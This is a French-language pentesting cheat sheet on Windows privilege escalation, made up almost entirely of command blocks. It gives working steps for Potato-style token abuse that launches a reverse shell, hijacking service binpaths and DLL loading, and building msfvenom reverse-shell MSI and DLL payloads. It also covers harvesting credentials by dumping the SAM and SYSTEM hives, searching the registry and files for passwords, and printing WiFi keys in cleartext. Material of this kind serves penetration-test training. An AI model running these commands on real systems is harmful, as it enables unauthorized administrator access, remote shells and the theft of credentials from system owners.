# Privilege Escalation - Windows

## Methodologie

1. Enumeration automatisee (WinPEAS, PowerUp, Seatbelt)
2. Verifier les privileges du token
3. Services mal configures
4. Taches planifiees
5. Chemins non quotes (Unquoted Service Paths)
6. AlwaysInstallElevated
7. Credentials sauvegardees
8. Kernel exploits (dernier recours)

## Outils d'enumeration

```powershell
# WinPEAS
winpeas.exe

# PowerUp
powershell -ep bypass
. .\PowerUp.ps1
Invoke-AllChecks

# Seatbelt
Seatbelt.exe -group=all
```

## Vecteurs d'escalade

### Privileges du token

```powershell
whoami /priv

# SeImpersonatePrivilege -> Potato attacks
# PrintSpoofer
PrintSpoofer.exe -c "cmd /c whoami"
PrintSpoofer.exe -i -c powershell.exe

# GodPotato / JuicyPotatoNG
GodPotato.exe -cmd "cmd /c reverse_shell.exe"
```

### Services mal configures

```powershell
# Lister les services
sc query state= all
wmic service get name,displayname,pathname,startmode

# Verifier les permissions d'un service
accesschk.exe /accepteula -ucqv SERVICE_NAME

# Si on peut modifier le binpath
sc config SERVICE_NAME binpath= "C:\Temp\reverse.exe"
sc stop SERVICE_NAME
sc start SERVICE_NAME
```

### Unquoted Service Paths

```powershell
# Trouver des chemins non quotes
wmic service get name,pathname,startmode | findstr /i /v "C:\Windows"

# Exemple : C:\Program Files\My App\service.exe
# Windows va essayer :
# C:\Program.exe
# C:\Program Files\My.exe
# C:\Program Files\My App\service.exe
# Placer un exe malicieux au bon endroit
```

### AlwaysInstallElevated

```powershell
# Verifier
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Si les deux sont a 1 :
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f msi -o shell.msi
msiexec /quiet /qn /i shell.msi
```

### Credentials sauvegardees

```powershell
# Credentials Windows
cmdkey /list
runas /savecred /user:admin cmd.exe

# Registre
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# Fichiers
findstr /si password *.txt *.ini *.config *.xml

# WiFi
netsh wlan show profiles
netsh wlan show profile name="SSID" key=clear

# SAM et SYSTEM (si accessibles)
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM
# Puis sur Kali
secretsdump.py -sam SAM -system SYSTEM LOCAL
```

### DLL Hijacking

```powershell
# Si un service charge une DLL manquante
# Creer une DLL malicieuse
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f dll -o hijack.dll
# Placer dans le repertoire du service
```

### Taches planifiees

```powershell
schtasks /query /fo LIST /v
# Chercher des taches executees par SYSTEM avec des scripts modifiables
```

### Autorun

```powershell
# Verifier les autorun
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
# Si un chemin est modifiable, remplacer par un payload
```
